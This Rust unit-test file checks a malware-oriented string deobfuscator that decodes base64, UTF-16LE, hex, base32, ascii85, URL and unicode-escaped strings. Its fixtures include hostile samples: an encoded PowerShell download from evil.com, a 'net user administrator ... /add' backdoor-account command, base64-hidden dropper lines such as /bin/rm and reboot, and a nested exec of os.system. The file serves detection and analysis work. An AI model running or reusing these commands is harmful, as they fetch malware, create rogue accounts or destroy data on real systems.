use super::base64_text::{decode_base64_string, decode_base64_strings, is_likely_base64};
use super::embedded::{deobfuscate_concatenation, extract_embedded_base64};
use super::*;
use std::sync::atomic::AtomicUsize;

#[test]
fn test_base64_decode() {
    let input = ExtractedString {
        value: "SGVsbG8gV29ybGQh".to_string(), // "Hello World!"
        data_offset: 0,
        method: StringMethod::RawScan,
        kind: Some(StringKind::Base64),
        ..Default::default()
    };

    let result = decode_base64_string(&input, &AtomicUsize::new(usize::MAX)).unwrap();
    assert_eq!(result.value, "Hello World!");
    assert_eq!(result.method, StringMethod::Base64Decode);
}

#[test]
fn test_base64_decode_short_commands() {
    // The dropper primitives hidden in `base64 -d <<< …` one-liners are
    // short: `/bin/rm` and `uname -a` each encode to just 12 base64 chars.
    // They must decode — the 12-char floor exists precisely for these.
    for (encoded, plain) in [
        ("L2Jpbi9ybQ==", "/bin/rm"),   // 7 bytes  -> 12 chars
        ("L2Jpbi9ybQo=", "/bin/rm\n"), // gentoo's exact literal
        ("dW5hbWUgLWE=", "uname -a"),  // 8 bytes  -> 12 chars
    ] {
        let s = make_string(encoded, Some(StringKind::Base64));
        let out = decode_base64_string(&s, &AtomicUsize::new(usize::MAX))
            .unwrap_or_else(|| panic!("{encoded} should decode to {plain:?}"));
        assert_eq!(out.value, plain);
        assert_eq!(out.method, StringMethod::Base64Decode);
    }
}

/// Encode an ASCII string as little-endian UTF-16 (the Windows wide-char form).
fn utf16le(s: &str) -> Vec<u8> {
    s.encode_utf16().flat_map(u16::to_le_bytes).collect()
}

#[test]
fn test_decode_utf16le_ascii() {
    assert_eq!(
        decode_utf16le(&utf16le("whoami /all")).as_deref(),
        Some("whoami /all")
    );
}

#[test]
fn test_decode_utf16le_strips_bom() {
    let mut bytes = vec![0xFF, 0xFE]; // UTF-16LE BOM
    bytes.extend(utf16le("Get-Process"));
    assert_eq!(decode_utf16le(&bytes).as_deref(), Some("Get-Process"));
}

#[test]
fn test_decode_utf16le_rejects_binary() {
    // Arbitrary binary should not be coerced into wide text.
    let binary = [0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00];
    assert_eq!(decode_utf16le(&binary), None);
}

#[test]
fn test_decode_utf16le_rejects_odd_length() {
    assert_eq!(decode_utf16le(&[0x48, 0x00, 0x65]), None);
}

#[test]
fn test_base64_decode_utf16le() {
    // The canonical Windows form: base64 over little-endian UTF-16, like the
    // payload of `powershell -EncodedCommand`, embedded in any filetype.
    let wide = utf16le("Invoke-WebRequest http://evil.com/x.exe");
    let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &wide);
    let result = decode_base64_string(
        &make_string(&b64, Some(StringKind::Base64)),
        &AtomicUsize::new(usize::MAX),
    )
    .expect("base64-over-utf16le should decode");
    assert_eq!(result.value, "Invoke-WebRequest http://evil.com/x.exe");
    assert_eq!(result.method, StringMethod::Base64Decode);
}

#[test]
fn test_decode_base64_strings_utf16le_batch() {
    let wide = utf16le("net user administrator P@ssw0rd /add");
    let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &wide);
    let results = decode_base64_strings(&[make_string(&b64, Some(StringKind::Base64))]);
    assert_eq!(results.len(), 1);
    assert_eq!(results[0].value, "net user administrator P@ssw0rd /add");
}

#[test]
fn test_hex_decode() {
    let input = ExtractedString {
        value: "48656c6c6f20576f726c6421".to_string(), // "Hello World!"
        data_offset: 0,
        method: StringMethod::RawScan,
        kind: Some(StringKind::HexEncoded),
        ..Default::default()
    };

    let result = decode_hex_variants(&input)
        .into_iter()
        .find(|decoded| decoded.method == StringMethod::HexDecode)
        .unwrap();
    assert_eq!(result.value, "Hello World!");
    assert_eq!(result.method, StringMethod::HexDecode);
}

#[test]
fn test_url_decode() {
    let input = ExtractedString {
        value: "Hello%20World%21%20%2B%20More".to_string(), // "Hello World! + More"
        data_offset: 0,
        method: StringMethod::RawScan,
        kind: Some(StringKind::UrlEncoded),
        ..Default::default()
    };

    let result = decode_url_string(&input).unwrap();
    assert_eq!(result.value, "Hello World! + More");
    assert_eq!(result.method, StringMethod::UrlDecode);
}

#[test]
fn test_url_with_normal_encoding_not_decoded_as_payload() {
    // A real URL whose percent-encoding only covers reserved chars (`:`,
    // space) is normal URL syntax, not an encoded payload — even when the
    // extracted string carries source context (`x = "..."`) and is therefore
    // classified UrlEncoded rather than Url. It must not produce a payload.
    let url = ExtractedString {
        value: "x = \"https://sourceware.org/gdb.html#:~:text=Function%3A%20to_string%20(self)\""
            .to_string(),
        data_offset: 0,
        method: StringMethod::RawScan,
        kind: Some(StringKind::UrlEncoded),
        ..Default::default()
    };
    assert!(decode_url_string(&url).is_none());
    assert!(decode_url_strings(std::slice::from_ref(&url)).is_empty());

    // But a URL that percent-encodes alphanumerics (obfuscation) is decoded.
    let obfuscated = ExtractedString {
        value: "https://evil.example/?d=%75%6e%61%6d%65%20-a".to_string(), // uname -a
        ..url.clone()
    };
    assert!(decode_url_string(&obfuscated).is_some());
}

#[test]
fn test_unicode_escape_decode() {
    let input = ExtractedString {
        value: "\\x48\\x65\\x6c\\x6c\\x6f".to_string(), // "Hello"
        data_offset: 0,
        method: StringMethod::RawScan,
        kind: Some(StringKind::UnicodeEscaped),
        ..Default::default()
    };

    let result = decode_unicode_escape_string(&input).unwrap();
    assert_eq!(result.value, "Hello");
    assert_eq!(result.method, StringMethod::UnicodeEscapeDecode);
}

#[test]
fn unicode_escape_decodes_through_redundant_backslash() {
    // Layered escape (a Python string literal inside a JSON/gyp string):
    // the on-disk bytes are a DOUBLE backslash `\\U000000NN` — written in
    // Rust source as `\\\\U...`. It must recover the clean word, not the
    // half-decoded `\c\a\t...`. This is the node-gyp `binding.gyp`
    // sandbox-escape obfuscation shape.
    assert_eq!(
        decode_unicode_escapes("\\\\U00000063\\\\U00000061\\\\U00000074\\\\U00000063\\\\U00000068")
            .as_deref(),
        Some("catch")
    );
    // Single-backslash escapes still decode exactly as before.
    assert_eq!(
        decode_unicode_escapes("\\x6e\\x6f\\x6e\\x65").as_deref(),
        Some("none")
    );
    assert_eq!(
        decode_unicode_escapes("\\U00000063\\U00000061\\U00000074").as_deref(),
        Some("cat")
    );
    // A benign Windows path is not eight hex digits after `\\U`, so it is
    // left untouched (no spurious decode).
    assert_eq!(decode_unicode_escapes("C:\\\\Users\\\\admin"), None);
}

#[test]
fn test_is_likely_base64() {
    assert!(is_likely_base64("SGVsbG8gV29ybGQhCg=="));
    assert!(!is_likely_base64("not base64!"));
    assert!(!is_likely_base64("short"));
}

#[test]
fn test_is_likely_hex() {
    assert!(is_likely_hex("48656c6c6f20576f726c6421"));
    assert!(!is_likely_hex("not hex!"));
    assert!(!is_likely_hex("48656c6c6f2")); // odd length
}

#[test]
fn test_base32_decode() {
    let input = ExtractedString {
        value: "JBSWY3DPEBLW64TMMQ======".to_string(), // "Hello World"
        data_offset: 0,
        method: StringMethod::RawScan,
        kind: Some(StringKind::Base32),
        ..Default::default()
    };

    let result = decode_base32_string(&input).unwrap();
    assert_eq!(result.value, "Hello World");
    assert_eq!(result.method, StringMethod::Base32Decode);
}

#[test]
fn test_base32_decode_nopad() {
    let input = ExtractedString {
        value: "JBSWY3DPEBLW64TMMQ".to_string(), // "Hello World" without padding
        data_offset: 0,
        method: StringMethod::RawScan,
        kind: Some(StringKind::Base32),
        ..Default::default()
    };

    let result = decode_base32_string(&input).unwrap();
    assert_eq!(result.value, "Hello World");
    assert_eq!(result.method, StringMethod::Base32Decode);
}

#[test]
fn test_base32_decode_long() {
    // Test with actual long base32 strings from real use
    let input = ExtractedString {
        value: "KRUGS4ZANFZSAYJAONSWG4TFOQQG2ZLTONQWOZJAMZXXEIDUMVZXI2LOM4======".to_string(),
        data_offset: 0,
        method: StringMethod::RawScan,
        kind: Some(StringKind::Base32),
        ..Default::default()
    };

    let result = decode_base32_string(&input).unwrap();
    assert_eq!(result.value, "This is a secret message for testing");
    assert_eq!(result.method, StringMethod::Base32Decode);
}

#[test]
fn test_base85_decode() {
    // Test with a simple known base85 string
    // We'll test the raw decoder function directly
    let decoded = decode_ascii85("9jqo^").unwrap();
    // 9jqo^ decodes to "Man " in ASCII85
    assert_eq!(decoded, b"Man ");
}

#[test]
fn test_ascii85_decode_with_z() {
    // Test 'z' shorthand for four zero bytes
    let decoded = decode_ascii85("z").unwrap();
    assert_eq!(decoded, vec![0u8; 4]);
}

#[test]
fn test_ascii85_decode_with_delimiters() {
    // Test that delimiters are properly skipped
    assert_eq!(decode_ascii85("<!!!!"), Some(vec![0x54, 0x01, 0xfe, 0xab]));
    assert_eq!(
        decode_ascii85("<~>u<!!~>"),
        Some(vec![0x5d, 0x51, 0x27, 0xd4])
    );
    assert_eq!(decode_ascii85("9j~qo^"), None);
    let decoded = decode_ascii85("<~9jqo^~>").unwrap();
    assert_eq!(decoded, b"Man ");
}

#[test]
fn test_is_likely_base32() {
    assert!(is_likely_base32("JBSWY3DPEBLW64TMMQ======"));
    assert!(is_likely_base32("MFRGG3DFMZTWQ2LK"));
    assert!(!is_likely_base32("not base32!"));
    assert!(!is_likely_base32("short"));
    assert!(!is_likely_base32("ABCDEFGHIJKLMNOP")); // no digits 2-7
}

#[test]
fn test_is_likely_base85() {
    // Plain text should not be detected as base85 (even if it has valid chars)
    assert!(!is_likely_base85("not base85!"));
    assert!(!is_likely_base85("short"));
    assert!(!is_likely_base85("library/alloc/src/raw_vec/mod.rs"));
    assert!(!is_likely_base85("operation not supported"));
    assert!(!is_likely_base85("Apple Certification Authority1"));

    // Note: With quality heuristic, even delimited strings need to decode to
    // significantly better text quality to be accepted
}

fn make_string(value: &str, kind: Option<StringKind>) -> ExtractedString {
    ExtractedString {
        value: value.to_string(),
        data_offset: 0,
        data_len: 0,
        method: StringMethod::RawScan,
        kind,
        fragments: None,
    }
}

#[test]
fn test_deobfuscate_concatenation_javascript() {
    let input = r#""SGVsbG8g" + "V29ybGQhCg==""#;
    assert_eq!(
        deobfuscate_concatenation(input),
        Some("SGVsbG8gV29ybGQhCg==".to_string())
    );
}

#[test]
fn test_deobfuscate_concatenation_python() {
    let input = r#"'SGVsbG8g' + 'V29ybGQhCg==""#;
    assert_eq!(
        deobfuscate_concatenation(input),
        Some("SGVsbG8gV29ybGQhCg==".to_string())
    );
}

#[test]
fn test_deobfuscate_concatenation_php() {
    let input = r#"'SGVsbG8g' . 'V29ybGQhCg==""#;
    assert_eq!(
        deobfuscate_concatenation(input),
        Some("SGVsbG8gV29ybGQhCg==".to_string())
    );
}

#[test]
fn test_deobfuscate_concatenation_no_pattern() {
    assert_eq!(deobfuscate_concatenation("simple_string_no_concat"), None);
}

#[test]
fn test_deobfuscate_concatenation_too_short() {
    assert_eq!(deobfuscate_concatenation(r#""ab" + "cd""#), None);
}

#[test]
fn test_decode_base64_strings_batch() {
    let inputs = vec![
        make_string("SGVsbG8gV29ybGQh", Some(StringKind::Base64)),
        make_string("VGVzdCBEYXRhISE=", Some(StringKind::Base64)),
        make_string("not_base64", None),
    ];
    let results = decode_base64_strings(&inputs);
    assert_eq!(results.len(), 2);
    assert_eq!(results[0].value, "Hello World!");
    assert_eq!(results[0].method, StringMethod::Base64Decode);
    assert_eq!(results[1].value, "Test Data!!");
}

#[test]
fn test_decode_base64_strings_with_concatenation() {
    let inputs = vec![make_string(r#""SGVsbG8g" + "V29ybGQh""#, None)];
    let results = decode_base64_strings(&inputs);
    assert_eq!(results.len(), 1);
    assert_eq!(results[0].value, "Hello World!");
    assert_eq!(results[0].method, StringMethod::Base64Decode);
}

#[test]
fn test_decode_base64_empty() {
    assert!(decode_base64_strings(&[]).is_empty());
}

#[test]
fn test_base64_too_short() {
    assert!(decode_base64_strings(&[make_string("SGVs", Some(StringKind::Base64))]).is_empty());
}

#[test]
fn test_base64_whitespace_trimming() {
    let results = decode_base64_strings(&[make_string(
        "  SGVsbG8gV29ybGQh  ",
        Some(StringKind::Base64),
    )]);
    assert_eq!(results.len(), 1);
    assert_eq!(results[0].value, "Hello World!");
}

#[test]
fn test_decode_hex_strings_batch() {
    let inputs = vec![
        make_string("48656c6c6f20576f726c6421", Some(StringKind::HexEncoded)),
        make_string("54657374204461746121", Some(StringKind::HexEncoded)),
        make_string("not_hex", None),
    ];
    let results = decode_hex_strings(&inputs);
    assert_eq!(results.len(), 2);
    assert_eq!(results[0].value, "Hello World!");
    assert_eq!(results[0].method, StringMethod::HexDecode);
    assert_eq!(results[1].value, "Test Data!");
    assert!(
        results
            .iter()
            .all(|result| result.method == StringMethod::HexDecode)
    );
}

#[test]
fn test_hex_xor_scan_respects_auto_detect_size_limit() {
    let key = 0x42;
    let mut decoded = vec![0x01 ^ key; crate::xor::MAX_AUTO_DETECT_SIZE + 1];
    for (index, byte) in b"http://example.test".iter().enumerate() {
        decoded[index] = byte ^ key;
    }
    let encoded = crate::bytes::to_hex(&decoded);
    let results = decode_hex_variants(&make_string(&encoded, Some(StringKind::HexEncoded)));
    assert!(
        results
            .iter()
            .all(|result| result.method != StringMethod::XorDecode),
        "oversized hex blobs must not trigger XOR scanning"
    );
}

#[test]
fn test_hex_odd_length() {
    assert!(
        decode_hex_strings(&[make_string(
            "48656c6c6f20576f726c642",
            Some(StringKind::HexEncoded)
        )])
        .is_empty()
    );
}

#[test]
fn test_hex_uppercase() {
    let results = decode_hex_strings(&[make_string(
        "48656C6C6F20576F726C6421",
        Some(StringKind::HexEncoded),
    )]);
    assert_eq!(results.len(), 1);
    assert_eq!(results[0].value, "Hello World!");
}

#[test]
fn test_decode_url_strings_batch() {
    let inputs = vec![
        make_string("Hello%20World%21", Some(StringKind::UrlEncoded)),
        make_string("Test%20Data%21%21", Some(StringKind::UrlEncoded)),
        make_string("no_encoding", None),
    ];
    let results = decode_url_strings(&inputs);
    assert_eq!(results.len(), 2);
    assert_eq!(results[0].value, "Hello World!");
    assert_eq!(results[0].method, StringMethod::UrlDecode);
    assert_eq!(results[1].value, "Test Data!!");
}

#[test]
fn test_url_special_chars() {
    let results = decode_url_strings(&[make_string(
        "path%2Fto%2Ffile%3Fquery%3Dvalue%26foo%3Dbar",
        Some(StringKind::UrlEncoded),
    )]);
    assert_eq!(results.len(), 1);
    assert_eq!(results[0].value, "path/to/file?query=value&foo=bar");
}

#[test]
fn test_decode_unicode_escape_strings_batch() {
    let inputs = vec![
        make_string(
            "\\x48\\x65\\x6c\\x6c\\x6f",
            Some(StringKind::UnicodeEscaped),
        ),
        make_string(
            "\\u0054\\u0065\\u0073\\u0074",
            Some(StringKind::UnicodeEscaped),
        ),
        make_string("no_escapes", None),
    ];
    let results = decode_unicode_escape_strings(&inputs);
    assert_eq!(results.len(), 2);
    assert_eq!(results[0].value, "Hello");
    assert_eq!(results[0].method, StringMethod::UnicodeEscapeDecode);
    assert_eq!(results[1].value, "Test");
}

#[test]
fn test_decode_base32_strings_batch() {
    let inputs = vec![
        make_string("JBSWY3DPEBLW64TMMQ======", Some(StringKind::Base32)),
        make_string("not_base32", None),
    ];
    let results = decode_base32_strings(&inputs);
    assert!(!results.is_empty());
    assert_eq!(results[0].value, "Hello World");
    assert_eq!(results[0].method, StringMethod::Base32Decode);
}

#[test]
fn test_base32_too_short() {
    assert!(decode_base32_strings(&[make_string("JBSWY3DP", Some(StringKind::Base32))]).is_empty());
}

#[test]
fn test_base85_with_whitespace() {
    if let Some(decoded) = decode_ascii85("<~9jqo^\n  \t~>") {
        assert_eq!(decoded, b"Man ");
    }
}

#[test]
fn test_base85_z_shorthand() {
    if let Some(decoded) = decode_ascii85("z") {
        assert_eq!(decoded, vec![0u8; 4]);
    }
}

#[test]
fn test_base85_invalid_char() {
    assert!(decode_ascii85("9jqo^~invalid~").is_none());
}

#[test]
fn test_base85_overflow_protection() {
    assert!(decode_ascii85("uuuuu").is_none());
}

#[test]
fn test_decoded_ip_classification() {
    let results = decode_hex_strings(&[make_string(
        "3139322e3136382e312e31",
        Some(StringKind::HexEncoded),
    )]);
    if !results.is_empty() {
        assert_eq!(results[0].value, "192.168.1.1");
        assert_eq!(results[0].kind, Some(StringKind::Ip));
    }
}

#[test]
fn test_base64_reject_identifier_false_positives() {
    // These are .NET interface/class names that look like base64 but decode to garbage
    // The input (readable identifier) should be considered higher quality than
    // the decoded output (binary garbage)
    let false_positives = [
        "IWorkItemQueriesExt2",
        "IWorkItemMyFavoritesExt2",
        "IVsImageService2",
        "IVsPersistHierarchyItem2",
        "QueryDefinition2",
        "IVsRunningDocumentTable3",
        "QueryItem2Collection",
        "QueryFolder2ContentsChangedEventArgs",
    ];

    for input in false_positives {
        let result = decode_base64_strings(&[make_string(input, None)]);
        assert!(
            result.is_empty(),
            "Should reject '{input}' as false positive base64"
        );
    }
}

// Tests for extract_embedded_base64

#[test]
fn test_extract_embedded_base64_python_style() {
    // Python: exec(base64.b64decode('SGVsbG8gV29ybGQh'))
    let input = make_string("exec(base64.b64decode('SGVsbG8gV29ybGQh'))", None);
    let results = extract_embedded_base64(&[input]);
    assert_eq!(results.len(), 1, "Should extract one embedded base64");
    assert_eq!(results[0].value, "Hello World!");
    assert_eq!(results[0].method, StringMethod::Base64Decode);
}

#[test]
fn test_extract_embedded_base64_shell_style() {
    // Shell: echo SGVsbG8gV29ybGQh | base64 -d
    let input = make_string(
        "echo SGVsbG8gV29ybGQh | base64 -d",
        Some(StringKind::ShellCmd),
    );
    let results = extract_embedded_base64(&[input]);
    assert_eq!(results.len(), 1, "Should extract one embedded base64");
    assert_eq!(results[0].value, "Hello World!");
}

#[test]
fn test_extract_embedded_base64_short_decode_command() {
    // gentoo-systemd's obfuscated `configure` and kin: a short base64 hidden
    // behind `base64 -d`/`--decode`/`-D`. Too short for the general floor,
    // but the command vouches for it — including the *unpadded* `reboot`,
    // which has no `=` to lean on. `/bin/rm` and `uname -a` are the other
    // primitives a dropper hides this way.
    for (line, plain) in [
        ("meson=${meson:-`base64 -d <<< L2Jpbi9ybQo=`}", "/bin/rm"),
        ("x=$(base64 --decode <<< dW5hbWUgLWE=)", "uname -a"),
        ("printf %s L2Jpbi9ybQ== | base64 -D", "/bin/rm"),
        ("base64 -d <<< cmVib290", "reboot"), // unpadded — command is the only signal
    ] {
        let results = extract_embedded_base64(&[make_string(line, None)]);
        assert!(
            results.iter().any(|r| r.value == plain),
            "{line:?} should decode {plain:?}, got {:?}",
            results.iter().map(|r| &r.value).collect::<Vec<_>>()
        );
    }
}

#[test]
fn test_extract_embedded_base64_padded_short_run() {
    // Padding is base64's own tell and almost never follows an identifier,
    // so a padded short run decodes on that signal alone — no command
    // needed. Both are too short (10–11 alnum) for the old fixed floor.
    for (line, plain) in [
        ("x := \"L2Jpbi9ybQ==\"", "/bin/rm"),
        ("arg=dW5hbWUgLWE=", "uname -a"),
    ] {
        let results = extract_embedded_base64(&[make_string(line, None)]);
        assert!(
            results.iter().any(|r| r.value == plain),
            "{line:?} should decode {plain:?}, got {:?}",
            results.iter().map(|r| &r.value).collect::<Vec<_>>()
        );
    }
}

#[test]
fn test_extract_embedded_base64_unpadded_short_needs_a_signal() {
    // `reboot` → `cmVib290` is 8 alnum with no padding: no signal on its
    // own, so a bare occurrence is ignored. This is what keeps the lower
    // floor from turning ordinary 8-char tokens into noise.
    let results = extract_embedded_base64(&[make_string("tag=cmVib290;", None)]);
    assert!(
        results.iter().all(|r| r.value != "reboot"),
        "unpadded short run without padding or a decode command must not be extracted"
    );
}

#[test]
fn test_extract_embedded_base64_javascript_atob() {
    // JavaScript: eval(atob('SGVsbG8gV29ybGQh'))
    let input = make_string("eval(atob('SGVsbG8gV29ybGQh'))", None);
    let results = extract_embedded_base64(&[input]);
    assert_eq!(results.len(), 1, "Should extract one embedded base64");
    assert_eq!(results[0].value, "Hello World!");
}

#[test]
fn test_extract_embedded_base64_skips_whole_string() {
    // If the entire string is base64, it should be skipped (handled by decode_base64_strings)
    let input = make_string("SGVsbG8gV29ybGQh", Some(StringKind::Base64));
    let results = extract_embedded_base64(&[input]);
    assert!(
        results.is_empty(),
        "Should skip strings that are entirely base64"
    );
}

#[test]
fn test_extract_embedded_base64_requires_valid_length() {
    // Even without padding, a remainder of one is impossible.
    let input = make_string("decode('SGVsbG9Xb3JsZ')", None); // 13 characters
    let results = extract_embedded_base64(&[input]);
    assert!(
        results.is_empty(),
        "Should reject base64 with invalid length"
    );
}

#[test]
fn base64_optional_padding_preserves_plain_and_embedded_evidence() {
    use base64::Engine;
    for plain in ["Hello World", "Hello World!", "Hello World!!"] {
        let padded = base64::engine::general_purpose::STANDARD.encode(plain);
        for token in [
            padded.as_str(),
            padded.trim_end_matches('='),
            padded.strip_suffix('=').unwrap_or(&padded),
        ] {
            let decoded = decode_base64_strings(&[make_string(token, None)]);
            assert!(
                decoded.iter().any(|s| s.value == plain),
                "whole token: {token}"
            );
            let line = format!("my $data = '{token}';");
            let mut input = make_string(&line, None);
            input.data_offset = 100;
            let decoded = extract_embedded_base64(&[input]);
            let evidence = decoded.iter().find(|s| s.value == plain).expect(token);
            assert_eq!(evidence.data_offset, 112);
            assert_eq!(evidence.data_len as usize, token.len());
            assert_eq!(evidence.method, StringMethod::Base64Decode);
        }
    }
}

#[test]
fn base64_optional_padding_rejects_malformed_encodings() {
    for token in [
        "SGVsbG8gV29yb",     // impossible remainder of one
        "SGVsbG8gV29ybGQ==", // excess padding
        "SGVsbG8gV29ybGR",   // nonzero unused trailing bits
        "SGVsbG8gV29ybGQ!",  // invalid alphabet
    ] {
        assert!(
            decode_base64_string(&make_string(token, None), &AtomicUsize::new(usize::MAX))
                .is_none(),
            "{token}"
        );
    }
}

#[test]
fn test_extract_embedded_base64_multiple_in_one_string() {
    // Multiple base64 strings in one line (must be >= 12 chars each to match regex)
    // "Hello World!" = SGVsbG8gV29ybGQh (16 chars)
    // "Test String!" = VGVzdCBTdHJpbmch (16 chars)
    let input = make_string("a = 'SGVsbG8gV29ybGQh'; b = 'VGVzdCBTdHJpbmch'", None);
    let results = extract_embedded_base64(&[input]);
    assert_eq!(
        results.len(),
        2,
        "Should extract both embedded base64 strings"
    );
}

#[test]
fn test_extract_embedded_base64_nested_code() {
    // Nested Python code - common in malware
    // Inner: "import os; os.system('whoami')"
    let inner_b64 = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScp";
    let input = make_string(&format!("exec(base64.b64decode('{inner_b64}'))"), None);
    let results = extract_embedded_base64(&[input]);
    assert_eq!(results.len(), 1);
    assert!(results[0].value.contains("import os"));
    assert!(results[0].value.contains("whoami"));
}

#[test]
fn test_extract_embedded_base64_rejects_short_decoded() {
    // Even if base64 is valid, decoded result must be >= 4 chars
    let input = make_string("decode('YWI=')", None); // decodes to "ab" (2 chars)
    let results = extract_embedded_base64(&[input]);
    assert!(
        results.is_empty(),
        "Should reject base64 that decodes to < 4 chars"
    );
}

#[test]
fn test_extract_embedded_base64_locates_the_token() {
    let value = "exec(base64.b64decode('SGVsbG8gV29ybGQh'))";
    let token = "SGVsbG8gV29ybGQh";
    let token_pos = value.find(token).unwrap() as u64;
    let input = ExtractedString {
        value: value.to_string(),
        data_offset: 12345,
        method: StringMethod::RawScan,
        ..Default::default()
    };
    let results = extract_embedded_base64(&[input]);
    assert_eq!(results.len(), 1);
    // The decoded payload's source is the base64 token itself: its offset is
    // the token's position within the parent, and its extent is the encoded
    // token length — not the parent offset, and not the decoded length.
    assert_eq!(results[0].data_offset, 12345 + token_pos);
    assert_eq!(results[0].data_len as usize, token.len());
    assert_eq!(
        results[0].source_spans().collect::<Vec<_>>(),
        vec![(12345 + token_pos, token.len() as u64)]
    );
}
